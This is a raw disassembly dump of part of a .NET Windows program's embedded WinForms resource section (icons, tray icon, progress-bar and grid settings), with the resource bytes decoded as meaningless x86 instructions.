  40a6e1:	03 99 4f 80 21 29    	add    0x2921804f(%rcx),%ebx
  40a6e7:	a5                   	movsl  (%rsi),(%rdi)
  40a6e8:	73 3c                	jae    0x40a726
  40a6ea:	ba 19 46 1a 31       	mov    $0x311a4619,%edx
  40a6ef:	6a 06                	push   $0x6
  40a6f1:	34 21                	xor    $0x21,%al
  40a6f3:	55                   	push   %rbp
  40a6f4:	c6                   	(bad)
  40a6f5:	6d                   	insl   (%dx),(%rdi)
  40a6f6:	c8 a9 19 dd          	enter  $0x19a9,$0xdd
  40a6fa:	5d                   	pop    %rbp
  40a6fb:	36 59                	ss pop %rcx
  40a6fd:	b7 a2                	mov    $0xa2,%bh
  40a6ff:	cc                   	int3
  40a700:	8c 61 ce             	mov    %fs,-0x32(%rcx)
  40a703:	39 66 ff             	cmp    %esp,-0x1(%rsi)
  40a706:	c9                   	leave
  40a707:	b1 bc                	mov    $0xbc,%cl
  40a709:	b2 ec                	mov    $0xec,%dl
  40a70b:	2d 05 b0 c9 b5       	sub    $0xb5c9b005,%eax
  40a710:	45 ce                	rex.RB (bad)
  40a712:	af                   	scas   (%rdi),%eax
  40a713:	b0 fd                	mov    $0xfd,%al
  40a715:	24 57                	and    $0x57,%al
  40a717:	b2 7b                	mov    $0x7b,%dl
  40a719:	f2 bc 9c 66 b1 40    	repnz mov $0x40b1669c,%esp
  40a71f:	17                   	(bad)
  40a720:	68 63 d2 9d 07       	push   $0x79dd263
  40a725:	5d                   	pop    %rbp
  40a726:	1f                   	(bad)
  40a727:	80 43 cc 92          	addb   $0x92,-0x34(%rbx)
  40a72b:	30 b1 d0 26 b2 2a    	xor    %dh,0x2ab226d0(%rcx)
  40a731:	c8 5a d7 97          	enter  $0xd75a,$0x97
  40a735:	77 1e                	ja     0x40a755
  40a737:	29 52 e6             	sub    %edx,-0x1a(%rdx)
  40a73a:	a9 b0 3b 93 10       	test   $0x10933bb0,%eax
  40a73f:	4a c8 3a 87 80       	rex.WX enter $0x873a,$0x80
  40a744:	77 62                	ja     0x40a7a8
  40a746:	b4 7c                	mov    $0x7c,%ah
  40a748:	ba f3 bf 27 3d       	mov    $0x3d27bff3,%edx
  40a74d:	23 23                	and    (%rbx),%esp
  40a74f:	f0 7c e4             	lock jl 0x40a736
  40a752:	89 fc                	mov    %edi,%esp
  40a754:	ec                   	in     (%dx),%al
  40a755:	54                   	push   %rsp
  40a756:	13 a3 10 3f e1 21    	adc    0x21e13f10(%rbx),%esp
  40a75c:	b4 00                	mov    $0x0,%ah
  40a75e:	00 00                	add    %al,(%rax)
  40a760:	ce                   	(bad)
  40a761:	ca ef be             	lret   $0xbeef
  40a764:	01 00                	add    %eax,(%rax)
  40a766:	00 00                	add    %al,(%rax)
  40a768:	91                   	xchg   %eax,%ecx
  40a769:	00 00                	add    %al,(%rax)
  40a76b:	00 6c 53 79          	add    %ch,0x79(%rbx,%rdx,2)
  40a76f:	73 74                	jae    0x40a7e5
  40a771:	65 6d                	gs insl (%dx),(%rdi)
  40a773:	2e 52                	cs push %rdx
  40a775:	65 73 6f             	gs jae 0x40a7e7
  40a778:	75 72                	jne    0x40a7ec
  40a77a:	63 65 73             	movsxd 0x73(%rbp),%esp
  40a77d:	2e 52                	cs push %rdx
  40a77f:	65 73 6f             	gs jae 0x40a7f1
  40a782:	75 72                	jne    0x40a7f6
  40a784:	63 65 52             	movsxd 0x52(%rbp),%esp
  40a787:	65 61                	gs (bad)
  40a789:	64 65 72 2c          	fs gs jb 0x40a7b9
  40a78d:	20 6d 73             	and    %ch,0x73(%rbp)
  40a790:	63 6f 72             	movsxd 0x72(%rdi),%ebp
  40a793:	6c                   	insb   (%dx),(%rdi)
  40a794:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%rdx),%esp
  40a79b:	73 69                	jae    0x40a806
  40a79d:	6f                   	outsl  (%rsi),(%dx)
  40a79e:	6e                   	outsb  (%rsi),(%dx)
  40a79f:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  40a7a4:	30 2e                	xor    %ch,(%rsi)
  40a7a6:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40a7a9:	43 75 6c             	rex.XB jne 0x40a818
  40a7ac:	74 75                	je     0x40a823
  40a7ae:	72 65                	jb     0x40a815
  40a7b0:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40a7b5:	72 61                	jb     0x40a818
  40a7b7:	6c                   	insb   (%dx),(%rdi)
  40a7b8:	2c 20                	sub    $0x20,%al
  40a7ba:	50                   	push   %rax
  40a7bb:	75 62                	jne    0x40a81f
  40a7bd:	6c                   	insb   (%dx),(%rdi)
  40a7be:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40a7c5:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40a7c9:	62 37 37 61 35       	(bad)
  40a7ce:	63 35 36 31 39 33    	movsxd 0x33393136(%rip),%esi        # 0x3379d90a
  40a7d4:	34 65                	xor    $0x65,%al
  40a7d6:	30 38                	xor    %bh,(%rax)
  40a7d8:	39 23                	cmp    %esp,(%rbx)
  40a7da:	53                   	push   %rbx
  40a7db:	79 73                	jns    0x40a850
  40a7dd:	74 65                	je     0x40a844
  40a7df:	6d                   	insl   (%dx),(%rdi)
  40a7e0:	2e 52                	cs push %rdx
  40a7e2:	65 73 6f             	gs jae 0x40a854
  40a7e5:	75 72                	jne    0x40a859
  40a7e7:	63 65 73             	movsxd 0x73(%rbp),%esp
  40a7ea:	2e 52                	cs push %rdx
  40a7ec:	75 6e                	jne    0x40a85c
  40a7ee:	74 69                	je     0x40a859
  40a7f0:	6d                   	insl   (%dx),(%rdi)
  40a7f1:	65 52                	gs push %rdx
  40a7f3:	65 73 6f             	gs jae 0x40a865
  40a7f6:	75 72                	jne    0x40a86a
  40a7f8:	63 65 53             	movsxd 0x53(%rbp),%esp
  40a7fb:	65 74 02             	gs je  0x40a800
	...
  40a806:	00 00                	add    %al,(%rax)
  40a808:	00 50 41             	add    %dl,0x41(%rax)
  40a80b:	44 50                	rex.R push %rax
  40a80d:	41                   	rex.B
  40a80e:	44 50                	rex.R push %rax
  40a810:	b4 00                	mov    $0x0,%ah
  40a812:	00 00                	add    %al,(%rax)
  40a814:	12 16                	adc    (%rsi),%dl
  40a816:	00 00                	add    %al,(%rax)
  40a818:	ce                   	(bad)
  40a819:	ca ef be             	lret   $0xbeef
  40a81c:	01 00                	add    %eax,(%rax)
  40a81e:	00 00                	add    %al,(%rax)
  40a820:	91                   	xchg   %eax,%ecx
  40a821:	00 00                	add    %al,(%rax)
  40a823:	00 6c 53 79          	add    %ch,0x79(%rbx,%rdx,2)
  40a827:	73 74                	jae    0x40a89d
  40a829:	65 6d                	gs insl (%dx),(%rdi)
  40a82b:	2e 52                	cs push %rdx
  40a82d:	65 73 6f             	gs jae 0x40a89f
  40a830:	75 72                	jne    0x40a8a4
  40a832:	63 65 73             	movsxd 0x73(%rbp),%esp
  40a835:	2e 52                	cs push %rdx
  40a837:	65 73 6f             	gs jae 0x40a8a9
  40a83a:	75 72                	jne    0x40a8ae
  40a83c:	63 65 52             	movsxd 0x52(%rbp),%esp
  40a83f:	65 61                	gs (bad)
  40a841:	64 65 72 2c          	fs gs jb 0x40a871
  40a845:	20 6d 73             	and    %ch,0x73(%rbp)
  40a848:	63 6f 72             	movsxd 0x72(%rdi),%ebp
  40a84b:	6c                   	insb   (%dx),(%rdi)
  40a84c:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%rdx),%esp
  40a853:	73 69                	jae    0x40a8be
  40a855:	6f                   	outsl  (%rsi),(%dx)
  40a856:	6e                   	outsb  (%rsi),(%dx)
  40a857:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  40a85c:	30 2e                	xor    %ch,(%rsi)
  40a85e:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40a861:	43 75 6c             	rex.XB jne 0x40a8d0
  40a864:	74 75                	je     0x40a8db
  40a866:	72 65                	jb     0x40a8cd
  40a868:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40a86d:	72 61                	jb     0x40a8d0
  40a86f:	6c                   	insb   (%dx),(%rdi)
  40a870:	2c 20                	sub    $0x20,%al
  40a872:	50                   	push   %rax
  40a873:	75 62                	jne    0x40a8d7
  40a875:	6c                   	insb   (%dx),(%rdi)
  40a876:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40a87d:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40a881:	62 37 37 61 35       	(bad)
  40a886:	63 35 36 31 39 33    	movsxd 0x33393136(%rip),%esi        # 0x3379d9c2
  40a88c:	34 65                	xor    $0x65,%al
  40a88e:	30 38                	xor    %bh,(%rax)
  40a890:	39 23                	cmp    %esp,(%rbx)
  40a892:	53                   	push   %rbx
  40a893:	79 73                	jns    0x40a908
  40a895:	74 65                	je     0x40a8fc
  40a897:	6d                   	insl   (%dx),(%rdi)
  40a898:	2e 52                	cs push %rdx
  40a89a:	65 73 6f             	gs jae 0x40a90c
  40a89d:	75 72                	jne    0x40a911
  40a89f:	63 65 73             	movsxd 0x73(%rbp),%esp
  40a8a2:	2e 52                	cs push %rdx
  40a8a4:	75 6e                	jne    0x40a914
  40a8a6:	74 69                	je     0x40a911
  40a8a8:	6d                   	insl   (%dx),(%rdi)
  40a8a9:	65 52                	gs push %rdx
  40a8ab:	65 73 6f             	gs jae 0x40a91d
  40a8ae:	75 72                	jne    0x40a922
  40a8b0:	63 65 53             	movsxd 0x53(%rbp),%esp
  40a8b3:	65 74 02             	gs je  0x40a8b8
  40a8b6:	00 00                	add    %al,(%rax)
  40a8b8:	00 0b                	add    %cl,(%rbx)
  40a8ba:	00 00                	add    %al,(%rax)
  40a8bc:	00 04 00             	add    %al,(%rax,%rax,1)
  40a8bf:	00 00                	add    %al,(%rax)
  40a8c1:	66 53                	push   %bx
  40a8c3:	79 73                	jns    0x40a938
  40a8c5:	74 65                	je     0x40a92c
  40a8c7:	6d                   	insl   (%dx),(%rdi)
  40a8c8:	2e 44 72 61          	rex.R jb,pn 0x40a92d
  40a8cc:	77 69                	ja     0x40a937
  40a8ce:	6e                   	outsb  (%rsi),(%dx)
  40a8cf:	67 2e 49 63 6f 6e    	cs movslq 0x6e(%r15d),%rbp
  40a8d5:	2c 20                	sub    $0x20,%al
  40a8d7:	53                   	push   %rbx
  40a8d8:	79 73                	jns    0x40a94d
  40a8da:	74 65                	je     0x40a941
  40a8dc:	6d                   	insl   (%dx),(%rdi)
  40a8dd:	2e 44 72 61          	rex.R jb,pn 0x40a942
  40a8e1:	77 69                	ja     0x40a94c
  40a8e3:	6e                   	outsb  (%rsi),(%dx)
  40a8e4:	67 2c 20             	addr32 sub $0x20,%al
  40a8e7:	56                   	push   %rsi
  40a8e8:	65 72 73             	gs jb  0x40a95e
  40a8eb:	69 6f 6e 3d 34 2e 30 	imul   $0x302e343d,0x6e(%rdi),%ebp
  40a8f2:	2e 30 2e             	cs xor %ch,(%rsi)
  40a8f5:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40a8f8:	43 75 6c             	rex.XB jne 0x40a967
  40a8fb:	74 75                	je     0x40a972
  40a8fd:	72 65                	jb     0x40a964
  40a8ff:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40a904:	72 61                	jb     0x40a967
  40a906:	6c                   	insb   (%dx),(%rdi)
  40a907:	2c 20                	sub    $0x20,%al
  40a909:	50                   	push   %rax
  40a90a:	75 62                	jne    0x40a96e
  40a90c:	6c                   	insb   (%dx),(%rdi)
  40a90d:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40a914:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40a918:	62                   	(bad)
  40a919:	30 33                	xor    %dh,(%rbx)
  40a91b:	66 35 66 37          	xor    $0x3766,%ax
  40a91f:	66 31 31             	xor    %si,(%rcx)
  40a922:	64 35 30 61 33 61    	fs xor $0x61336130,%eax
  40a928:	6a 53                	push   $0x53
  40a92a:	79 73                	jns    0x40a99f
  40a92c:	74 65                	je     0x40a993
  40a92e:	6d                   	insl   (%dx),(%rdi)
  40a92f:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
  40a932:	64 65 44 6f          	fs rex.R outsl %gs:(%rsi),(%dx)
  40a936:	6d                   	insl   (%dx),(%rdi)
  40a937:	2e 4d                	cs rex.WRB
  40a939:	65 6d                	gs insl (%dx),(%rdi)
  40a93b:	62 65 72 41 74       	(bad)
  40a940:	74 72                	je     0x40a9b4
  40a942:	69 62 75 74 65 73 2c 	imul   $0x2c736574,0x75(%rdx),%esp
  40a949:	20 53 79             	and    %dl,0x79(%rbx)
  40a94c:	73 74                	jae    0x40a9c2
  40a94e:	65 6d                	gs insl (%dx),(%rdi)
  40a950:	2c 20                	sub    $0x20,%al
  40a952:	56                   	push   %rsi
  40a953:	65 72 73             	gs jb  0x40a9c9
  40a956:	69 6f 6e 3d 34 2e 30 	imul   $0x302e343d,0x6e(%rdi),%ebp
  40a95d:	2e 30 2e             	cs xor %ch,(%rsi)
  40a960:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40a963:	43 75 6c             	rex.XB jne 0x40a9d2
  40a966:	74 75                	je     0x40a9dd
  40a968:	72 65                	jb     0x40a9cf
  40a96a:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40a96f:	72 61                	jb     0x40a9d2
  40a971:	6c                   	insb   (%dx),(%rdi)
  40a972:	2c 20                	sub    $0x20,%al
  40a974:	50                   	push   %rax
  40a975:	75 62                	jne    0x40a9d9
  40a977:	6c                   	insb   (%dx),(%rdi)
  40a978:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40a97f:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40a983:	62 37 37 61 35       	(bad)
  40a988:	63 35 36 31 39 33    	movsxd 0x33393136(%rip),%esi        # 0x3379dac4
  40a98e:	34 65                	xor    $0x65,%al
  40a990:	30 38                	xor    %bh,(%rax)
  40a992:	39 6d 53             	cmp    %ebp,0x53(%rbp)
  40a995:	79 73                	jns    0x40aa0a
  40a997:	74 65                	je     0x40a9fe
  40a999:	6d                   	insl   (%dx),(%rdi)
  40a99a:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40a99d:	6f                   	outsl  (%rsi),(%dx)
  40a99e:	62 61 6c 69 7a       	(bad)
  40a9a3:	61                   	(bad)
  40a9a4:	74 69                	je     0x40aa0f
  40a9a6:	6f                   	outsl  (%rsi),(%dx)
  40a9a7:	6e                   	outsb  (%rsi),(%dx)
  40a9a8:	2e 43 75 6c          	rex.XB jne,pn 0x40aa18
  40a9ac:	74 75                	je     0x40aa23
  40a9ae:	72 65                	jb     0x40aa15
  40a9b0:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40a9b2:	66 6f                	outsw  (%rsi),(%dx)
  40a9b4:	2c 20                	sub    $0x20,%al
  40a9b6:	6d                   	insl   (%dx),(%rdi)
  40a9b7:	73 63                	jae    0x40aa1c
  40a9b9:	6f                   	outsl  (%rsi),(%dx)
  40a9ba:	72 6c                	jb     0x40aa28
  40a9bc:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%rdx),%esp
  40a9c3:	73 69                	jae    0x40aa2e
  40a9c5:	6f                   	outsl  (%rsi),(%dx)
  40a9c6:	6e                   	outsb  (%rsi),(%dx)
  40a9c7:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  40a9cc:	30 2e                	xor    %ch,(%rsi)
  40a9ce:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40a9d1:	43 75 6c             	rex.XB jne 0x40aa40
  40a9d4:	74 75                	je     0x40aa4b
  40a9d6:	72 65                	jb     0x40aa3d
  40a9d8:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40a9dd:	72 61                	jb     0x40aa40
  40a9df:	6c                   	insb   (%dx),(%rdi)
  40a9e0:	2c 20                	sub    $0x20,%al
  40a9e2:	50                   	push   %rax
  40a9e3:	75 62                	jne    0x40aa47
  40a9e5:	6c                   	insb   (%dx),(%rdi)
  40a9e6:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40a9ed:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40a9f1:	62 37 37 61 35       	(bad)
  40a9f6:	63 35 36 31 39 33    	movsxd 0x33393136(%rip),%esi        # 0x3379db32
  40a9fc:	34 65                	xor    $0x65,%al
  40a9fe:	30 38                	xor    %bh,(%rax)
  40aa00:	39 66 53             	cmp    %esp,0x53(%rsi)
  40aa03:	79 73                	jns    0x40aa78
  40aa05:	74 65                	je     0x40aa6c
  40aa07:	6d                   	insl   (%dx),(%rdi)
  40aa08:	2e 44 72 61          	rex.R jb,pn 0x40aa6d
  40aa0c:	77 69                	ja     0x40aa77
  40aa0e:	6e                   	outsb  (%rsi),(%dx)
  40aa0f:	67 2e 53             	addr32 cs push %rbx
  40aa12:	69 7a 65 2c 20 53 79 	imul   $0x7953202c,0x65(%rdx),%edi
  40aa19:	73 74                	jae    0x40aa8f
  40aa1b:	65 6d                	gs insl (%dx),(%rdi)
  40aa1d:	2e 44 72 61          	rex.R jb,pn 0x40aa82
  40aa21:	77 69                	ja     0x40aa8c
  40aa23:	6e                   	outsb  (%rsi),(%dx)
  40aa24:	67 2c 20             	addr32 sub $0x20,%al
  40aa27:	56                   	push   %rsi
  40aa28:	65 72 73             	gs jb  0x40aa9e
  40aa2b:	69 6f 6e 3d 34 2e 30 	imul   $0x302e343d,0x6e(%rdi),%ebp
  40aa32:	2e 30 2e             	cs xor %ch,(%rsi)
  40aa35:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40aa38:	43 75 6c             	rex.XB jne 0x40aaa7
  40aa3b:	74 75                	je     0x40aab2
  40aa3d:	72 65                	jb     0x40aaa4
  40aa3f:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40aa44:	72 61                	jb     0x40aaa7
  40aa46:	6c                   	insb   (%dx),(%rdi)
  40aa47:	2c 20                	sub    $0x20,%al
  40aa49:	50                   	push   %rax
  40aa4a:	75 62                	jne    0x40aaae
  40aa4c:	6c                   	insb   (%dx),(%rdi)
  40aa4d:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40aa54:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40aa58:	62                   	(bad)
  40aa59:	30 33                	xor    %dh,(%rbx)
  40aa5b:	66 35 66 37          	xor    $0x3766,%ax
  40aa5f:	66 31 31             	xor    %si,(%rcx)
  40aa62:	64 35 30 61 33 61    	fs xor $0x61336130,%eax
  40aa68:	06                   	(bad)
  40aa69:	cc                   	int3
  40aa6a:	89 87 e1 63 90 97    	mov    %eax,-0x686f9c1f(%rdi)
  40aa70:	42 6a 9b             	rex.X push $0xffffffffffffff9b
  40aa73:	9a                   	(bad)
  40aa74:	43 b5 a8             	rex.XB mov $0xa8,%r13b
  40aa77:	b6 51                	mov    $0x51,%dh
  40aa79:	2b 3a                	sub    (%rdx),%edi
  40aa7b:	b8 32 b4 d9 e6       	mov    $0xe6d9b432,%eax
  40aa80:	1d a2 53 04 1b       	sbb    $0x1b0453a2,%eax
  40aa85:	51                   	push   %rcx
  40aa86:	b2 0e                	mov    $0xe,%dl
  40aa88:	94                   	xchg   %eax,%esp
  40aa89:	1d 9a 17 e8 7d       	sbb    $0x7de8179a,%eax
  40aa8e:	85 33                	test   %esi,(%rbx)
  40aa90:	bc 42 74 39 00       	mov    $0x397442,%esp
  40aa95:	00 00                	add    %al,(%rax)
  40aa97:	00 25 00 00 00 50    	add    %ah,0x50000000(%rip)        # 0x5040aa9d
  40aa9d:	00 00                	add    %al,(%rax)
  40aa9f:	00 69 00             	add    %ch,0x0(%rcx)
  40aaa2:	00 00                	add    %al,(%rax)
  40aaa4:	86 00                	xchg   %al,(%rax)
  40aaa6:	00 00                	add    %al,(%rax)
  40aaa8:	a7                   	cmpsl  (%rdi),(%rsi)
  40aaa9:	00 00                	add    %al,(%rax)
  40aaab:	00 d8                	add    %bl,%al
  40aaad:	00 00                	add    %al,(%rax)
  40aaaf:	00 ff                	add    %bh,%bh
  40aab1:	00 00                	add    %al,(%rax)
  40aab3:	00 20                	add    %ah,(%rax)
  40aab5:	01 00                	add    %eax,(%rax)
  40aab7:	00 41 01             	add    %al,0x1(%rcx)
  40aaba:	00 00                	add    %al,(%rax)
  40aabc:	66 01 00             	add    %ax,(%rax)
  40aabf:	00 3d 04 00 00 20    	add    %bh,0x20000004(%rip)        # 0x2040aac9
  40aac5:	24 00                	and    $0x0,%al
  40aac7:	74 00                	je     0x40aac9
  40aac9:	68 00 69 00 73       	push   $0x73006900
  40aace:	00 2e                	add    %ch,(%rsi)
  40aad0:	00 53 00             	add    %dl,0x0(%rbx)
  40aad3:	6e                   	outsb  (%rsi),(%dx)
  40aad4:	00 61 00             	add    %ah,0x0(%rcx)
  40aad7:	70 00                	jo     0x40aad9
  40aad9:	54                   	push   %rsp
  40aada:	00 6f 00             	add    %ch,0x0(%rdi)
  40aadd:	47 00 72 00          	rex.RXB add %r14b,0x0(%r10)
  40aae1:	69 00 64 00 00 00    	imul   $0x64,(%rax),%eax
  40aae7:	00 00                	add    %al,(%rax)
  40aae9:	26 24 00             	es and $0x0,%al
  40aaec:	74 00                	je     0x40aaee
  40aaee:	68 00 69 00 73       	push   $0x73006900
  40aaf3:	00 2e                	add    %ch,(%rsi)
  40aaf5:	00 54 00 72          	add    %dl,0x72(%rax,%rax,1)
  40aaf9:	00 61 00             	add    %ah,0x0(%rcx)
  40aafc:	79 00                	jns    0x40aafe
  40aafe:	4c 00 61 00          	rex.WR add %r12b,0x0(%rcx)
  40ab02:	72 00                	jb     0x40ab04
  40ab04:	67 00 65 00          	add    %ah,0x0(%ebp)
  40ab08:	49 00 63 00          	rex.WB add %spl,0x0(%r11)
  40ab0c:	6f                   	outsl  (%rsi),(%dx)
  40ab0d:	00 6e 00             	add    %ch,0x0(%rsi)
  40ab10:	02 00                	add    (%rax),%al
  40ab12:	00 00                	add    %al,(%rax)
  40ab14:	14 24                	adc    $0x24,%al
  40ab16:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
  40ab1a:	00 69 00             	add    %ch,0x0(%rcx)
  40ab1d:	73 00                	jae    0x40ab1f
  40ab1f:	2e 00 49 00          	cs add %cl,0x0(%rcx)
  40ab23:	63 00                	movsxd (%rax),%eax
  40ab25:	6f                   	outsl  (%rsi),(%dx)
  40ab26:	00 6e 00             	add    %ch,0x0(%rsi)
  40ab29:	04 00                	add    $0x0,%al
  40ab2b:	00 00                	add    %al,(%rax)
  40ab2d:	18 24 00             	sbb    %ah,(%rax,%rax,1)
  40ab30:	74 00                	je     0x40ab32
  40ab32:	68 00 69 00 73       	push   $0x73006900
  40ab37:	00 2e                	add    %ch,(%rsi)
  40ab39:	00 4c 00 6f          	add    %cl,0x6f(%rax,%rax,1)
  40ab3d:	00 63 00             	add    %ah,0x0(%rbx)
  40ab40:	6b 00 65             	imul   $0x65,(%rax),%eax
  40ab43:	00 64 00 c3          	add    %ah,-0x3d(%rax,%rax,1)
  40ab47:	09 00                	or     %eax,(%rax)
  40ab49:	00 1c 24             	add    %bl,(%rsp)
  40ab4c:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
  40ab50:	00 69 00             	add    %ch,0x0(%rcx)
  40ab53:	73 00                	jae    0x40ab55
  40ab55:	2e 00 44 00 72       	cs add %al,0x72(%rax,%rax,1)
  40ab5a:	00 61 00             	add    %ah,0x0(%rcx)
  40ab5d:	77 00                	ja     0x40ab5f
  40ab5f:	47 00 72 00          	rex.RXB add %r14b,0x0(%r10)
  40ab63:	69 00 64 00 c5 09    	imul   $0x9c50064,(%rax),%eax
  40ab69:	00 00                	add    %al,(%rax)
  40ab6b:	2c 70                	sub    $0x70,%al
  40ab6d:	00 72 00             	add    %dh,0x0(%rdx)
  40ab70:	6f                   	outsl  (%rsi),(%dx)
  40ab71:	00 67 00             	add    %ah,0x0(%rdi)
  40ab74:	72 00                	jb     0x40ab76
  40ab76:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
  40ab7a:	73 00                	jae    0x40ab7c
  40ab7c:	42 00 61 00          	rex.X add %spl,0x0(%rcx)
  40ab80:	72 00                	jb     0x40ab82
  40ab82:	31 00                	xor    %eax,(%rax)
  40ab84:	2e 00 4d 00          	cs add %cl,0x0(%rbp)
  40ab88:	6f                   	outsl  (%rsi),(%dx)
  40ab89:	00 64 00 69          	add    %ah,0x69(%rax,%rax,1)
  40ab8d:	00 66 00             	add    %ah,0x0(%rsi)
  40ab90:	69 00 65 00 72 00    	imul   $0x720065,(%rax),%eax
  40ab96:	73 00                	jae    0x40ab98
  40ab98:	c7                   	(bad)
  40ab99:	09 00                	or     %eax,(%rax)
  40ab9b:	00 22                	add    %ah,(%rdx)
  40ab9d:	24 00                	and    $0x0,%al
  40ab9f:	74 00                	je     0x40aba1
  40aba1:	68 00 69 00 73       	push   $0x73006900
  40aba6:	00 2e                	add    %ch,(%rsi)
  40aba8:	00 4c 00 6f          	add    %cl,0x6f(%rax,%rax,1)
  40abac:	00 63 00             	add    %ah,0x0(%rbx)
  40abaf:	61                   	(bad)
  40abb0:	00 6c 00 69          	add    %ch,0x69(%rax,%rax,1)
  40abb4:	00 7a 00             	add    %bh,0x0(%rdx)
  40abb7:	61                   	(bad)
  40abb8:	00 62 00             	add    %ah,0x0(%rdx)
  40abbb:	6c                   	insb   (%dx),(%rdi)
  40abbc:	00 65 00             	add    %ah,0x0(%rbp)
  40abbf:	64 0a 00             	or     %fs:(%rax),%al
  40abc2:	00 1c 24             	add    %bl,(%rsp)
  40abc5:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
  40abc9:	00 69 00             	add    %ch,0x0(%rcx)
  40abcc:	73 00                	jae    0x40abce
  40abce:	2e 00 4c 00 61       	cs add %cl,0x61(%rax,%rax,1)
  40abd3:	00 6e 00             	add    %ch,0x0(%rsi)
  40abd6:	67 00 75 00          	add    %dh,0x0(%ebp)
  40abda:	61                   	(bad)
  40abdb:	00 67 00             	add    %ah,0x0(%rdi)
  40abde:	65 00 66 0a          	add    %ah,%gs:0xa(%rsi)
  40abe2:	00 00                	add    %al,(%rax)
  40abe4:	1c 24                	sbb    $0x24,%al
  40abe6:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
  40abea:	00 69 00             	add    %ch,0x0(%rcx)
  40abed:	73 00                	jae    0x40abef
  40abef:	2e 00 47 00          	cs add %al,0x0(%rdi)
  40abf3:	72 00                	jb     0x40abf5
  40abf5:	69 00 64 00 53 00    	imul   $0x530064,(%rax),%eax
  40abfb:	69 00 7a 00 65 00    	imul   $0x65007a,(%rax),%eax
  40ac01:	2a 11                	sub    (%rcx),%dl
  40ac03:	00 00                	add    %al,(%rax)
  40ac05:	20 24 00             	and    %ah,(%rax,%rax,1)
  40ac08:	74 00                	je     0x40ac0a
  40ac0a:	68 00 69 00 73       	push   $0x73006900
  40ac0f:	00 2e                	add    %ch,(%rsi)
  40ac11:	00 54 00 72          	add    %dl,0x72(%rax,%rax,1)
  40ac15:	00 61 00             	add    %ah,0x0(%rcx)
  40ac18:	79 00                	jns    0x40ac1a
  40ac1a:	48 00 65 00          	rex.W add %spl,0x0(%rbp)
  40ac1e:	69 00 67 00 68 00    	imul   $0x680067,(%rax),%eax
  40ac24:	74 00                	je     0x40ac26
  40ac26:	ce                   	(bad)
  40ac27:	11 00                	adc    %eax,(%rax)
  40ac29:	00 26                	add    %ah,(%rsi)
  40ac2b:	70 00                	jo     0x40ac2d
  40ac2d:	72 00                	jb     0x40ac2f
  40ac2f:	6f                   	outsl  (%rsi),(%dx)
  40ac30:	00 67 00             	add    %ah,0x0(%rdi)
  40ac33:	72 00                	jb     0x40ac35
  40ac35:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
  40ac39:	73 00                	jae    0x40ac3b
  40ac3b:	42 00 61 00          	rex.X add %spl,0x0(%rcx)
  40ac3f:	72 00                	jb     0x40ac41
  40ac41:	31 00                	xor    %eax,(%rax)
  40ac43:	2e 00 4c 00 6f       	cs add %cl,0x6f(%rax,%rax,1)
  40ac48:	00 63 00             	add    %ah,0x0(%rbx)
  40ac4b:	6b 00 65             	imul   $0x65,(%rax),%eax
  40ac4e:	00 64 00 d3          	add    %ah,-0x2d(%rax,%rax,1)
  40ac52:	11 00                	adc    %eax,(%rax)
  40ac54:	00 02                	add    %al,(%rdx)
  40ac56:	01 02                	add    %eax,(%rdx)
  40ac58:	00 40 00             	add    %al,0x0(%rax)
  40ac5b:	01 00                	add    %eax,(%rax)
  40ac5d:	00 00                	add    %al,(%rax)
  40ac5f:	ff                   	(bad)
  40ac60:	ff                   	(bad)
  40ac61:	ff                   	(bad)
  40ac62:	ff 01                	incl   (%rcx)
  40ac64:	00 00                	add    %al,(%rax)
  40ac66:	00 00                	add    %al,(%rax)
  40ac68:	00 00                	add    %al,(%rax)
  40ac6a:	00 0c 02             	add    %cl,(%rdx,%rax,1)
  40ac6d:	00 00                	add    %al,(%rax)
  40ac6f:	00 51 53             	add    %dl,0x53(%rcx)
  40ac72:	79 73                	jns    0x40ace7
  40ac74:	74 65                	je     0x40acdb
  40ac76:	6d                   	insl   (%dx),(%rdi)
  40ac77:	2e 44 72 61          	rex.R jb,pn 0x40acdc
  40ac7b:	77 69                	ja     0x40ace6
  40ac7d:	6e                   	outsb  (%rsi),(%dx)
  40ac7e:	67 2c 20             	addr32 sub $0x20,%al
